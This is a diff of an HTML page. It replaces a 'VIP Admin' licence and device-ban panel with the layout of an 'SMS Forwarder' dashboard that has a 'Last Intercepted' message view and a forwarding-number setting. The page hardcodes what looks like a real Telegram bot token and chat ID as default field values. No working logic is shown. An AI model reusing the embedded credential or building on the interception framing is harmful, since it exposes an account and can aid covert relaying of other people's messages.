@@ -1,860 +1,754 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>VIP Admin</title>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;700;800&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
-    <style>
-        /* --- CORE VARIABLES --- */
-        :root {
-            --bg: #050508; --card: #0e0e14; --nav: #161621; 
-            --accent: #00e5ff; --text: #ffffff; --muted: #94a3b8; 
-            --border: rgba(255, 255, 255, 0.08); 
-            --green: #00ff9d; --red: #ff0055; --warn: #f59e0b;
-            --glass: blur(12px) saturate(180%);
-        }
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>SMS Forwarder</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Bebas+Neue&display=swap');
 
-        /* --- THEME DEFINITIONS --- */
-        [data-theme="Cyberpunk"] { --bg:#050508; --card:#0e0e14; --nav:#161621; --accent:#00e5ff; }
-        [data-theme="Matrix"] { --bg:#000000; --card:#051a05; --nav:#001100; --accent:#00ff00; --green:#00ff00; --red:#008800; }
-        [data-theme="Blood"] { --bg:#1a0505; --card:#2b0a0a; --nav:#360000; --accent:#ff0033; --green:#ff3333; --red:#ff0033; }
-        [data-theme="Ocean"] { --bg:#00111a; --card:#002233; --nav:#00334d; --accent:#00ccff; }
-        [data-theme="Gold"] { --bg:#0f0d00; --card:#1f1a00; --nav:#2d2600; --accent:#ffd700; }
-        [data-theme="Violet"] { --bg:#0f001a; --card:#1f0033; --nav:#2d004d; --accent:#9933ff; }
+  :root {
+    --bg:      #0d1117;
+    --bg2:     #161b22;
+    --bg3:     #1c2129;
+    --border:  #30363d;
+    --tg:      #2CA5E0;
+    --green:   #3fb950;
+    --red:     #f85149;
+    --yellow:  #d29922;
+    --text:    #e6edf3;
+    --muted:   #7d8590;
+  }
 
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; user-select: none; }
-        body { margin: 0; padding: 0; font-family: 'Outfit', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; padding-bottom: 120px; overflow-x: hidden; transition: background 0.3s, color 0.3s; }
-        
-        #bgCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; pointer-events: none; }
+  * { margin:0; padding:0; box-sizing:border-box; }
 
-        /* --- HEADER --- */
-        header { position: sticky; top: 0; z-index: 50; background: rgba(0,0,0,0.7); backdrop-filter: var(--glass); border-bottom: 1px solid var(--border); padding: 15px 24px; display: flex; justify-content: space-between; align-items: center; }
-        .brand { font-weight: 800; font-size: 1.2rem; display: flex; align-items: center; gap: 10px; }
-        .icon-btn { width: 42px; height: 42px; border-radius: 12px; background: rgba(255,255,255,0.03); border: 1px solid var(--border); color: var(--text); display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; }
-        .icon-btn:active { transform: scale(0.9); background: var(--accent); color: #000; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    min-height: 100vh;
+  }
 
-        /* --- LAYOUT --- */
-        .container { max-width: 650px; margin: 0 auto; padding: 20px; }
-        .hidden { display: none !important; }
+  /* ── HEADER ── */
+  header {
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    padding: 0 20px;
+    height: 52px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+  .logo { font-family: 'Bebas Neue'; font-size: 22px; letter-spacing: 2px; color: var(--tg); }
+  .logo span { color: var(--text); }
+  .status-pill {
+    display: flex; align-items: center; gap: 8px;
+    font-size: 11px; font-weight: 600; letter-spacing: .1em;
+    padding: 5px 14px; border-radius: 20px;
+    border: 1px solid var(--border);
+    transition: all .3s;
+  }
+  .status-pill.active { border-color: var(--green); color: var(--green); background: rgba(63,185,80,.08); }
+  .status-pill.stopped { border-color: var(--red); color: var(--red); background: rgba(248,81,73,.08); }
+  .dot {
+    width: 8px; height: 8px; border-radius: 50%;
+    background: currentColor;
+  }
+  .dot.pulse { animation: pulse 1.4s ease-in-out infinite; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }
 
-        /* --- FILTER BUTTONS CSS --- */
-        .filter-row { display: flex; gap: 8px; margin-bottom: 15px; overflow-x: auto; padding-bottom: 5px; }
-        .filter-btn { flex: 1; background: rgba(255,255,255,0.03); border: 1px solid var(--border); color: var(--muted); padding: 10px; border-radius: 10px; font-size: 0.7rem; font-weight: 800; cursor: pointer; white-space: nowrap; transition: 0.2s; letter-spacing: 0.5px; }
-        .filter-btn.active { background: rgba(0, 229, 255, 0.15); border-color: var(--accent); color: var(--accent); }
-        .filter-btn:active { transform: scale(0.95); }
+  /* ── LAYOUT ── */
+  .container { max-width: 860px; margin: 0 auto; padding: 24px 16px; }
 
-        /* --- CONTROLS --- */
-        .controls { display: flex; gap: 12px; margin-bottom: 20px; align-items: center; }
-        .search-box { position: relative; flex: 1; }
-        .search-box i { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); color: var(--muted); }
-        .input-glass { width: 100%; background: rgba(0,0,0,0.3); border: 1px solid var(--border); padding: 14px 14px 14px 44px; color: var(--text); border-radius: 14px; font-family: 'Outfit', sans-serif; font-size: 0.95rem; }
-        .input-glass:focus { border-color: var(--accent); }
-        
-        .btn-gradient { background: linear-gradient(135deg, var(--accent), var(--green)); color: #000; border: none; padding: 0 20px; height: 48px; border-radius: 14px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; box-shadow: 0 5px 15px -5px var(--accent); white-space: nowrap; }
-        
-        /* --- CARDS --- */
-        .glass-card { background: var(--card); border: 1px solid var(--border); border-radius: 18px; padding: 18px; margin-bottom: 12px; position: relative; backdrop-filter: blur(10px); display: flex; flex-direction: column; gap: 10px; transition: 0.2s; }
-        
-        .key-row-top { display: flex; justify-content: space-between; align-items: flex-start; }
-        
-        .badge { padding: 4px 10px; border-radius: 6px; font-size: 0.65rem; font-weight: 800; text-transform: uppercase; }
-        .badge.active { background: rgba(0, 255, 157, 0.15); color: var(--green); }
-        .badge.inactive { background: rgba(255, 0, 85, 0.15); color: var(--red); }
-        
-        .badge.days-ok { background: rgba(0, 229, 255, 0.15); color: var(--accent); }
-        .badge.days-warn { background: rgba(245, 158, 11, 0.15); color: var(--warn); }
-        .badge.days-exp { background: rgba(255, 0, 85, 0.15); color: var(--red); }
+  /* ── CARDS ── */
+  .card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 20px;
+    margin-bottom: 14px;
+  }
+  .card-title {
+    font-size: 10px; font-weight: 700;
+    letter-spacing: .14em; text-transform: uppercase;
+    color: var(--muted); margin-bottom: 14px;
+    display: flex; align-items: center; gap: 8px;
+  }
+  .card-title .icon { font-size: 14px; }
 
-        .key-details { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; font-size: 0.8rem; color: var(--muted); }
-        .detail-item { display: flex; align-items: center; gap: 6px; }
-        .detail-item i { color: var(--accent); }
+  /* ── LAST INTERCEPT ── */
+  .intercept-box {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 14px;
+    font-size: 12px;
+    line-height: 1.8;
+  }
+  .intercept-box .from { color: var(--tg); font-weight: 700; font-size: 15px; }
+  .intercept-box .msg  { color: var(--muted); margin-top: 4px; word-break: break-all; }
+  .intercept-box .badge {
+    display: inline-block; margin-top: 8px;
+    padding: 2px 10px; border-radius: 20px; font-size: 10px; font-weight: 700;
+    background: rgba(63,185,80,.1); color: var(--green);
+    border: 1px solid rgba(63,185,80,.3);
+  }
+  .intercept-box.empty { color: var(--muted); text-align: center; padding: 28px; }
 
-        .key-actions-row { display: flex; justify-content: flex-end; gap: 8px; margin-top: 5px; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 10px; }
-        .btn-mini { width: 36px; height: 36px; border-radius: 10px; display: flex; align-items: center; justify-content: center; cursor: pointer; border: 1px solid transparent; transition: 0.2s; }
-        .btn-view { background: rgba(255,255,255,0.05); color: var(--muted); border-color: var(--border); }
-        .btn-view:hover { background: var(--accent); color: #000; }
-        .btn-edit { background: rgba(245, 158, 11, 0.1); color: var(--warn); border-color: rgba(245, 158, 11, 0.3); }
-        .btn-edit:hover { background: var(--warn); color: #000; }
-        .btn-del { background: rgba(255,0,85,0.1); color: var(--red); border-color: rgba(255,0,85,0.3); }
-        .btn-del:hover { background: var(--red); color: #fff; }
+  /* ── INPUTS ── */
+  label { display: block; font-size: 10px; color: var(--muted);
+          letter-spacing: .1em; text-transform: uppercase; margin-bottom: 6px; }
+  input {
+    width: 100%; background: var(--bg3);
+    border: 1px solid var(--border); border-radius: 7px;
+    padding: 10px 14px; color: var(--text);
+    font-family: 'JetBrains Mono', monospace; font-size: 13px;
+    outline: none; transition: border .2s;
+  }
+  input:focus { border-color: var(--tg); }
+  input::placeholder { color: #3d444d; }
+  .input-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
 
-        /* --- CONFIG FORM --- */
-        .cfg-section { margin-bottom: 25px; }
-        .cfg-head { color: var(--accent); font-weight: 700; font-size: 0.9rem; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; display: flex; align-items: center; justify-content: space-between; gap: 8px; }
-        
-        .inp-label { display: block; color: var(--muted); font-size: 0.75rem; font-weight: 700; margin-bottom: 6px; margin-top: 12px; }
-        .inp-field { width: 100%; background: rgba(255,255,255,0.03); border: 1px solid var(--border); padding: 12px; color: #fff; border-radius: 10px; font-family: 'Outfit', sans-serif; }
-        
-        /* Main Toggle Switch */
-        .switch { position: relative; display: inline-block; width: 50px; height: 28px; }
-        .switch input { opacity: 0; width: 0; height: 0; }
-        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(255,255,255,0.1); border: 1px solid var(--border); transition: .4s; border-radius: 34px; }
-        .slider:before { position: absolute; content: ""; height: 20px; width: 20px; left: 3px; bottom: 3px; background-color: #fff; transition: .4s; border-radius: 50%; box-shadow: 0 2px 5px rgba(0,0,0,0.3); }
-        input:checked + .slider { background-color: var(--accent); border-color: var(--accent); }
-        input:checked + .slider:before { transform: translateX(22px); background-color: #000; }
+  /* ── BUTTONS ── */
+  .btn {
+    padding: 11px 20px; border-radius: 7px; border: none;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px; font-weight: 700; letter-spacing: .08em;
+    cursor: pointer; transition: all .2s;
+  }
+  .btn-primary { background: var(--tg); color: #fff; }
+  .btn-primary:hover { background: #1a8fc7; }
+  .btn-outline { background: transparent; color: var(--tg);
+                 border: 1px solid var(--tg); }
+  .btn-outline:hover { background: rgba(44,165,224,.1); }
+  .btn-green  { background: var(--green); color: #0d1117; }
+  .btn-green:hover { background: #2ea043; }
+  .btn-red    { background: rgba(248,81,73,.15); color: var(--red);
+                border: 1px solid rgba(248,81,73,.3); }
+  .btn-red:hover { background: rgba(248,81,73,.25); }
+  .btn-row { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 14px; }
+  .btn-full { width: 100%; }
 
-        /* Mini Toggle Switch */
-        .switch-mini { position: relative; display: inline-block; width: 34px; height: 20px; }
-        .switch-mini input { opacity: 0; width: 0; height: 0; }
-        .slider-mini { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(255,255,255,0.1); border-radius: 34px; transition: .4s; }
-        .slider-mini:before { position: absolute; content: ""; height: 14px; width: 14px; left: 3px; bottom: 3px; background-color: white; border-radius: 50%; transition: .4s; }
-        input:checked + .slider-mini { background-color: var(--green); }
-        input:checked + .slider-mini:before { transform: translateX(14px); }
+  /* ── LOG ── */
+  .log-box {
+    background: #010409;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    height: 200px;
+    overflow-y: auto;
+    padding: 10px 12px;
+    font-size: 11px;
+    line-height: 1.9;
+  }
+  .log-box::-webkit-scrollbar { width: 3px; }
+  .log-box::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+  .log-entry { border-bottom: 1px solid rgba(48,54,61,.4); padding: 2px 0; }
+  .log-entry .time { color: #3d444d; margin-right: 8px; }
+  .log-entry.ok   .txt { color: var(--green); }
+  .log-entry.err  .txt { color: var(--red); }
+  .log-entry.info .txt { color: var(--tg); }
+  .log-entry.warn .txt { color: var(--yellow); }
 
-        /* --- NAV DOCK --- */
-        .nav-dock { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 400px; height: 70px; background: var(--nav); border: 1px solid var(--border); border-radius: 24px; display: flex; justify-content: space-evenly; align-items: center; box-shadow: 0 20px 50px rgba(0,0,0,0.6); backdrop-filter: var(--glass); z-index: 100; padding: 0 10px; }
-        .nav-item { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; color: var(--muted); font-size: 1.2rem; transition: 0.3s; cursor: pointer; height: 100%; position: relative; }
-        .nav-item.active { color: var(--accent); transform: translateY(-3px); }
-        .nav-lbl { font-size: 0.65rem; font-weight: 700; margin-top: 4px; opacity: 0.7; }
+  /* ── STATS ── */
+  .stats { display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 14px; }
+  .stat {
+    flex: 1 1 100px;
+    background: var(--bg2); border: 1px solid var(--border);
+    border-radius: 8px; padding: 14px 16px;
+  }
+  .stat .s-label { font-size: 9px; color: var(--muted); letter-spacing: .14em;
+                   text-transform: uppercase; margin-bottom: 6px; }
+  .stat .s-val   { font-family: 'Bebas Neue'; font-size: 28px; line-height: 1; }
+  .stat .s-val.green  { color: var(--green); }
+  .stat .s-val.red    { color: var(--red); }
+  .stat .s-val.blue   { color: var(--tg); }
+  .stat .s-val.yellow { color: var(--yellow); }
 
-        /* --- MODALS --- */
-        .modal-wrap { position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:200; display:flex; align-items:center; justify-content:center; backdrop-filter:blur(5px); opacity:0; pointer-events:none; transition:0.3s; }
-        .modal-wrap.open { opacity:1; pointer-events:all; }
-        .modal-card { background: #121218; width:90%; max-width:400px; padding:25px; border-radius: 24px; border: 1px solid var(--border); max-height: 85vh; overflow-y: auto; box-shadow: 0 0 50px rgba(0,0,0,0.5); }
-        
-        .panel-theme-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .panel-theme-btn { padding: 15px; background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 12px; text-align: center; cursor: pointer; transition: 0.2s; font-weight: 700; color: var(--muted); }
-        .panel-theme-btn:hover { background: rgba(255,255,255,0.08); color: #fff; }
-        .panel-theme-btn.active { border-color: var(--accent); background: rgba(0, 229, 255, 0.1); color: var(--accent); }
+  /* ── FORWARD NUMBER BIG ── */
+  .fwd-num-display {
+    background: var(--bg3); border: 1px solid rgba(44,165,224,.2);
+    border-radius: 8px; padding: 14px 16px;
+    font-family: 'Bebas Neue'; font-size: 26px;
+    color: var(--tg); letter-spacing: 3px;
+    margin-bottom: 14px;
+  }
+  .fwd-num-display span { font-family: 'JetBrains Mono'; font-size: 10px;
+                           color: var(--muted); display: block;
+                           letter-spacing: .1em; text-transform: uppercase; margin-bottom: 4px; }
 
-        .toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%) translateY(-100px); background: var(--nav); border: 1px solid var(--accent); padding: 12px 24px; border-radius: 50px; z-index: 300; display: flex; align-items: center; gap: 10px; transition: 0.4s; font-weight: 600; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .toast.show { transform: translateX(-50%) translateY(0); }
+  /* ── TABS ── */
+  .tabs { display: flex; gap: 0; border-bottom: 1px solid var(--border); margin-bottom: 20px; }
+  .tab {
+    padding: 10px 18px; font-size: 11px; font-weight: 700;
+    letter-spacing: .1em; text-transform: uppercase;
+    color: var(--muted); cursor: pointer; border: none;
+    background: none; border-bottom: 2px solid transparent;
+    transition: all .2s; margin-bottom: -1px;
+  }
+  .tab.active { color: var(--tg); border-bottom-color: var(--tg); }
 
-        .center-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; width: 100%; }
-        
-        .gen-btn {
-            background: rgba(0, 229, 255, 0.15); border: 1px solid var(--accent); color: var(--accent);
-            padding: 4px 10px; border-radius: 6px; font-size: 0.7rem; cursor: pointer;
-            font-weight: 700; transition: 0.2s; display: flex; align-items: center; gap: 5px;
-        }
-        .gen-btn:active { background: var(--accent); color: #000; }
+  .tab-content { display: none; }
+  .tab-content.active { display: block; }
 
-        .shortcut-row { display: flex; gap: 8px; margin-top: 8px; margin-bottom: 15px; }
-        .btn-shortcut { background: rgba(255, 255, 255, 0.03); border: 1px solid var(--border); color: var(--muted); padding: 8px; border-radius: 8px; font-size: 0.75rem; font-weight: 600; cursor: pointer; transition: 0.2s; flex: 1; }
-        .btn-shortcut:hover { border-color: var(--accent); color: var(--accent); background: rgba(0, 229, 255, 0.1); }
+  /* ── TOAST ── */
+  #toast {
+    position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(80px);
+    background: var(--bg2); border: 1px solid var(--border);
+    border-radius: 8px; padding: 10px 20px;
+    font-size: 12px; font-weight: 600;
+    transition: transform .3s ease; z-index: 999;
+  }
+  #toast.show { transform: translateX(-50%) translateY(0); }
+  #toast.ok   { border-color: var(--green); color: var(--green); }
+  #toast.err  { border-color: var(--red); color: var(--red); }
 
-        /* DATABASE LIST CSS */
-        .db-item { display: flex; align-items: center; justify-content: space-between; background: rgba(255,255,255,0.03); border: 1px solid var(--border); padding: 10px; border-radius: 10px; margin-bottom: 8px; }
-        .db-item.active { border-color: var(--green); background: rgba(0, 255, 157, 0.05); }
-        .db-url { font-size: 0.7rem; color: var(--muted); font-family: 'JetBrains Mono', monospace; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 150px; }
-        .db-actions { display: flex; gap: 5px; }
-    </style>
+  /* ── SPINNER ── */
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .spin { display: inline-block; width: 12px; height: 12px;
+          border: 2px solid currentColor; border-top-color: transparent;
+          border-radius: 50%; animation: spin .6s linear infinite; }
+
+  /* ── SLIDE IN ── */
+  @keyframes slideIn {
+    from { opacity:0; transform: translateY(-6px); }
+    to   { opacity:1; transform: translateY(0); }
+  }
+  .slide-in { animation: slideIn .35s ease; }
+</style>
 </head>
 <body>
 
-    <canvas id="bgCanvas"></canvas>
+<!-- HEADER -->
+<header>
+  <div class="logo">SMS <span>FORWARDER</span></div>
+  <div id="statusPill" class="status-pill stopped">
+    <div class="dot" id="statusDot"></div>
+    <span id="statusText">STOPPED</span>
+  </div>
+</header>
 
-    <div id="setupView" class="center-screen" style="display:none;">
-        <i class="fas fa-users-cog" style="font-size: 3rem; color: var(--accent); margin-bottom: 20px;"></i>
-        <h2 style="margin-bottom: 10px;">Connect Database</h2>
-        <input type="text" class="input-glass" id="setupInput" placeholder="https://your-app.firebaseio.com" style="margin-bottom:15px; width:100%; max-width:300px;">
-        <button class="btn-gradient" style="width:100%; max-width:300px; justify-content:center;" onclick="saveSetupUrl()">CONNECT</button>
+<div class="container">
+
+  <!-- TABS -->
+  <div class="tabs">
+    <button class="tab active" onclick="showTab('live')">📡 Live</button>
+    <button class="tab" onclick="showTab('config')">⚙️ Config</button>
+    <button class="tab" onclick="showTab('logs')">📋 Logs</button>
+  </div>
+
+  <!-- ━━━ LIVE TAB ━━━ -->
+  <div id="tab-live" class="tab-content active">
+
+    <!-- Stats -->
+    <div class="stats">
+      <div class="stat">
+        <div class="s-label">Total</div>
+        <div class="s-val blue" id="statTotal">0</div>
+      </div>
+      <div class="stat">
+        <div class="s-label">Sent</div>
+        <div class="s-val green" id="statSent">0</div>
+      </div>
+      <div class="stat">
+        <div class="s-label">Failed</div>
+        <div class="s-val red" id="statFailed">0</div>
+      </div>
+      <div class="stat">
+        <div class="s-label">Avg Speed</div>
+        <div class="s-val yellow" id="statAvg">--</div>
+      </div>
     </div>
 
-    <div id="appView" class="hidden">
-        <header>
-            <div class="brand"><i class="fas fa-shield-alt"></i> VIP ADMIN</div>
-            <div style="display:flex; gap:10px;">
-                <div class="icon-btn" onclick="openPanelThemeModal()"><i class="fas fa-palette"></i></div>
-                <div class="icon-btn" onclick="appInit(true)"><i class="fas fa-sync-alt"></i></div>
-            </div>
-        </header>
-
-        <div class="container">
-            <div id="loader" style="text-align: center; padding: 100px 0;">
-                <i class="fas fa-circle-notch fa-spin" style="font-size: 3rem; color: var(--accent);"></i>
-                <p style="color: var(--muted); margin-top: 20px;">SYNCING...</p>
-            </div>
-
-            <div id="tabUsers" class="hidden">
-                <div class="filter-row">
-                    <button class="filter-btn active" id="btnFilterAll" onclick="setFilter('all')">ALL</button>
-                    <button class="filter-btn" id="btnFilterActive" onclick="setFilter('active')">ACTIVE</button>
-                    <button class="filter-btn" id="btnFilterBanned" onclick="setFilter('banned')">BANNED</button>
-                    <button class="filter-btn" id="btnFilterExpired" onclick="setFilter('expired')">EXPIRED</button>
-                </div>
-
-                <div class="controls">
-                    <div class="search-box">
-                        <i class="fas fa-search"></i>
-                        <input type="text" class="input-glass" id="searchUser" placeholder="Search Title/Naam" onkeyup="renderUsers()">
-                    </div>
-                    <button class="btn-gradient" onclick="openUserModal()"><i class="fas fa-user-plus"></i></button>
-                </div>
-                <div id="usersList"></div>
-            </div>
-
-            <div id="tabBanned" class="hidden">
-                 <div class="glass-card">
-                    <div style="display:flex; align-items:center; gap:10px; margin-bottom:15px; border-bottom:1px solid var(--border); padding-bottom:15px;">
-                        <i class="fas fa-ban" style="color: var(--red); font-size:1.2rem;"></i>
-                        <span style="font-weight:700; color:#fff;">Blacklist Device</span>
-                    </div>
-
-                    <div class="inp-label" style="margin-top:0;">ENTER DEVICE ID</div>
-                    <div style="display:flex; gap:10px; align-items:stretch; margin-bottom:10px;">
-                        <input type="text" class="inp-field" id="banDeviceInput" placeholder="Device ID..." style="flex:1;">
-                        <button class="gen-btn" style="height:auto; font-size:0.8rem; background: var(--red); color:#fff; border-color:var(--red);" onclick="addBannedDevice()">
-                            <i class="fas fa-ban"></i> BAN
-                        </button>
-                    </div>
-                </div>
-
-                <div class="inp-label">BANNED LIST</div>
-                <div id="bannedListContainer"></div>
-            </div>
-
-            <div id="tabConfig" class="hidden">
-                <div class="glass-card">
-                    <div style="display:flex; align-items:center; gap:10px; margin-bottom:15px; border-bottom:1px solid var(--border); padding-bottom:15px;">
-                        <i class="fas fa-cogs" style="color: var(--accent); font-size:1.2rem;"></i>
-                        <span style="font-weight:700; color:#fff;">App Config</span>
-                    </div>
-
-                    <div style="display:flex; justify-content:space-between; align-items:center;">
-                        <span style="font-size:0.9rem; color:var(--text);">Maintenance Mode</span>
-                        <label class="switch">
-                            <input type="checkbox" id="cfgMaint" onchange="saveAppConfig()">
-                            <span class="slider"></span>
-                        </label>
-                    </div>
-
-                    <div class="inp-label">MAINTENANCE MESSAGE</div>
-                    <input type="text" class="inp-field" id="cfgMsg" onchange="saveAppConfig()">
-
-                    <div class="inp-label">ADMIN / CONTACT URL</div>
-                    <input type="text" class="inp-field" id="cfgUrl" placeholder="https://t.me/..." onchange="saveAppConfig()">
-                </div>
-
-                <div class="glass-card" style="min-height: 250px;">
-                    <div style="display:flex; align-items:center; gap:10px; margin-bottom:15px; border-bottom:1px solid var(--border); padding-bottom:15px;">
-                        <i class="fas fa-database" style="color: var(--accent); font-size:1.2rem;"></i>
-                        <span style="font-weight:700; color:#fff;">Servers</span>
-                    </div>
-                    
-                    <div class="inp-label" style="margin-top:0;">ADD NEW SERVERS</div>
-                    <div style="display:flex; gap:10px; align-items:stretch; margin-bottom:20px;">
-                        <input type="text" class="inp-field" id="newDbUrlInput" placeholder="https://...firebaseio.com" style="flex:1;">
-                        <button class="gen-btn" style="height:auto; font-size:0.8rem; background: var(--accent); color:#000;" onclick="addNewDatabase()">
-                            <i class="fas fa-plus"></i> ADD
-                        </button>
-                    </div>
-
-                    <div class="inp-label">SAVED LINKS</div>
-                    <div id="dbListContainer" style="max-height:300px; overflow-y:auto; margin-bottom:10px;">
-                    </div>
-
-                    <div style="width:100%; height:1px; background:var(--border); margin:15px 0;"></div>
-
-                    <button class="btn-gradient" style="width:100%; background: linear-gradient(135deg, var(--red), #ff4444); color: white; justify-content:center;" onclick="hardReset()">DISCONNECT</button>
-                </div>
-            </div>
-        </div>
-
-        <div class="nav-dock">
-            <div class="nav-item active" id="navUsers" onclick="switchTab('users')">
-                <i class="fas fa-users"></i><span class="nav-lbl">USERS</span>
-            </div>
-            
-            <button class="btn-gradient" onclick="openUserModal()"><i class="fas fa-user-plus"></i></button>        
-            
-            <div class="nav-item" id="navBanned" onclick="switchTab('banned')">
-                <i class="fas fa-ban"></i><span class="nav-lbl">BANNED</span>
-            </div>
-
-            <div class="nav-item" id="navConf" onclick="switchTab('conf')">
-                <i class="fas fa-sliders-h"></i><span class="nav-lbl">FIREBASE</span>
-            </div>
-        </div>
+    <!-- Forward number -->
+    <div class="fwd-num-display">
+      <span>Forwarding to</span>
+      <span id="displayFwdNum">Not set</span>
     </div>
 
-    <div id="userModal" class="modal-wrap">
-        <div class="modal-card">
-            <h3 style="margin-top:0; color:#fff;" id="modalTitle">New User</h3>
-            <input type="hidden" id="isEditMode" value="false">
-            <input type="hidden" id="originUsername"> <div class="inp-label">TITLE</div>
-            <input type="text" class="inp-field" id="newTitle" placeholder="Name / Title">
-
-            <div class="inp-label">USERNAME</div>
-            <input type="text" class="inp-field" id="newUsername" placeholder="e.g. 440728" oninput="syncCreds(this.value, 'pass')">
-            
-            <div style="display:flex; gap:10px; margin-top:5px;">
-                <button class="gen-btn" style="flex:1; justify-content:center;" onclick="autoGenCreds()"><i class="fas fa-magic"></i> Gen</button>
-                <button class="gen-btn" style="flex:1; justify-content:center;" onclick="pasteToBoth()"><i class="fas fa-paste"></i> Paste</button>
-            </div>
-            
-            <div class="inp-label">PASSWORD</div>
-            <input type="text" class="inp-field" id="newPassword" placeholder="Password" oninput="syncCreds(this.value, 'user')">
-
-            <div class="inp-label">DEVICE LIMIT</div>
-            <input type="number" class="inp-field" placeholder="Max Devices" id="newLimit" value="1">
-
-            <div class="inp-label">EXPIRY DATE</div>
-            <input type="date" class="inp-field" id="newExpiry">
-            
-            <div class="shortcut-row">
-                <button type="button" class="btn-shortcut" onclick="setExpiryShortcut(-3)">Expired</button>
-                <button type="button" class="btn-shortcut" onclick="setExpiryShortcut(1)">+1 Day</button>
-                <button type="button" class="btn-shortcut" onclick="setExpiryShortcut(14)">+15 Days</button>
-                <button type="button" class="btn-shortcut" onclick="setExpiryShortcut(29)">+30 Days</button>
-            </div>
-
-            <button class="btn-gradient" style="width:100%; justify-content:center; margin-top:20px;" onclick="saveUser()" id="btnSaveUser">CREATE USER</button>
-            <button class="btn-mini btn-view" style="width:100%; margin-top:10px; border:none;" onclick="closeModals()">CANCEL</button>
-        </div>
+    <!-- Last intercepted -->
+    <div class="card">
+      <div class="card-title"><span class="icon">📱</span> Last Intercepted</div>
+      <div id="lastInterceptBox" class="intercept-box empty">
+        Waiting for Telegram messages...
+      </div>
     </div>
 
-    <div id="deviceModal" class="modal-wrap">
-        <div class="modal-card">
-            <h3 style="margin-top:0; color:#fff; display:flex; justify-content:space-between;">
-                <span>Devices</span> <i class="fas fa-times" onclick="closeModals()"></i>
-            </h3>
-            <div id="deviceListContent" style="margin-top:15px;"></div>
-        </div>
+    <!-- Start/Stop -->
+    <div class="btn-row">
+      <button id="btnToggle" class="btn btn-green btn-full" onclick="toggleService()">
+        ▶ START SERVICE
+      </button>
+    </div>
+  </div>
+
+  <!-- ━━━ CONFIG TAB ━━━ -->
+  <div id="tab-config" class="tab-content">
+
+    <!-- Forward Number -->
+    <div class="card">
+      <div class="card-title"><span class="icon">➡️</span> Forward To Number</div>
+      <label>Jis number pe SMS bheja jayega</label>
+      <input id="inpFwdNum" type="tel" placeholder="+91XXXXXXXXXX" />
     </div>
 
-    <div id="panelThemeModal" class="modal-wrap">
-        <div class="modal-card">
-            <h3 style="margin-top:0; color:#fff; margin-bottom:15px;">Panel Theme</h3>
-            <div class="panel-theme-grid">
-                <div class="panel-theme-btn" onclick="setPanelTheme('Cyberpunk')">CYBERPUNK</div>
-                <div class="panel-theme-btn" onclick="setPanelTheme('Matrix')">MATRIX</div>
-                <div class="panel-theme-btn" onclick="setPanelTheme('Blood')">BLOOD</div>
-                <div class="panel-theme-btn" onclick="setPanelTheme('Ocean')">OCEAN</div>
-                <div class="panel-theme-btn" onclick="setPanelTheme('Gold')">GOLD</div>
-                <div class="panel-theme-btn" onclick="setPanelTheme('Violet')">VIOLET</div>
-            </div>
-            <button class="btn-mini btn-view" style="width:100%; margin-top:20px; border:none;" onclick="closeModals()">CLOSE</button>
+    <!-- Telegram Bot -->
+    <div class="card">
+      <div class="card-title"><span class="icon">✈️</span> Telegram Bot</div>
+      <div class="input-row">
+        <div>
+          <label>Bot Token</label>
+          <input id="inpToken" type="password"
+            value="8177489970:AAE1GpiPXl-iMBGEWpsO1mBYpZUccd3navo"
+            placeholder="123456:ABCdef..." />
         </div>
+        <div>
+          <label>Chat ID</label>
+          <input id="inpChatId" type="text"
+            value="8261652786"
+            placeholder="8261652786" />
+        </div>
+      </div>
     </div>
 
-    <div id="toast" class="toast"><i class="fas fa-check-circle" style="color:var(--green)"></i><span>Saved</span></div>
+    <!-- Firebase -->
+    <div class="card">
